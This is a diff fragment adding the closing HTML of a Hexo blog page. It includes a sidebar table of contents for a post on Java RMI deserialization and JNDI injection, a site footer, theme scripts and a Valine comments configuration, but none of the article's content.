+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8"><span class="nav-number">1.</span> <span class="nav-text">Java RMI反序列化与JNDI注入入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.</span> <span class="nav-text">RMI反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="nav-number">1.1.1.</span> <span class="nav-text">名词解释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.2.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.3.</span> <span class="nav-text">具体代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BBregistry"><span class="nav-number">1.1.4.</span> <span class="nav-text">攻击registry</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bind-amp-rebind"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">bind &amp; rebind</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lookup"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">lookup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jdk8u121%E4%B9%8B%E5%89%8D"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">jdk8u121之前</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jdk8u121-8u232-b09"><span class="nav-number">1.1.4.4.</span> <span class="nav-text">jdk8u121~8u232_b09</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#JRMP-Listener-amp-amp-JRMP-Client"><span class="nav-number">1.1.4.4.1.</span> <span class="nav-text">JRMP Listener &amp;&amp; JRMP Client</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#registry%E6%94%BB%E5%87%BBclient"><span class="nav-number">1.1.5.</span> <span class="nav-text">registry攻击client</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#client%E6%94%BB%E5%87%BBserver"><span class="nav-number">1.1.6.</span> <span class="nav-text">client攻击server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AD%94%E6%94%B9%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">魔改代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#server%E6%94%BB%E5%87%BBclient"><span class="nav-number">1.1.7.</span> <span class="nav-text">server攻击client</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">JNDI注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI"><span class="nav-number">1.2.1.</span> <span class="nav-text">JNDI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI%E7%BB%91%E5%AE%9A%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.2.2.</span> <span class="nav-text">RMI绑定远程对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-Reference"><span class="nav-number">1.2.3.</span> <span class="nav-text">JNDI Reference</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-Reference-LDAP"><span class="nav-number">1.2.4.</span> <span class="nav-text">JNDI Reference+LDAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E9%93%BE%E8%BF%9B%E8%A1%8C%E6%89%A7%E8%A1%8C"><span class="nav-number">1.2.5.</span> <span class="nav-text">利用本地链进行执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">#1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">#2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.3.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
